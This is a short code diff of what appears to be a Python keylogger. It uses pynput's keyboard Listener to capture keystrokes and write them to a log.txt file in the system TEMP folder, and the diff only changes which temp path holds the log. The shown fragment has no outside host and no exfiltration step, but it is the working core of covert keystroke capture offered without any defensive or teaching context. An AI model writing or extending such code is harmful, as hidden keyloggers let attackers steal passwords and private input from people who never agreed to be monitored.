@@ -2,17 +2,17 @@ import os
 from pynput.keyboard import Key, Listener
 
 # Get the system temp folder dynamically
-#temp_path = os.path.join(os.environ["TEMP"])
-#log_file = os.path.join(temp_path, "log.txt")
+temp_path = os.path.join(os.environ["TEMP"])
+log_file = os.path.join(temp_path, "log.txt")
 
 # Get the system temp folder dynamically
-temp_path = os.path.join(os.environ["TEMP"], "new")
+#temp_path = os.path.join(os.environ["TEMP"], "new")
 
 # Ensure the 'new' directory exists
-os.makedirs(temp_path, exist_ok=True)
+#os.makedirs(temp_path, exist_ok=True)
 
 # Set the log file path
-log_file = os.path.join(temp_path, "log.txt")
+#log_file = os.path.join(temp_path, "log.txt")
 
 def write_to_file(key):
     key = str(key).replace("'", "")  
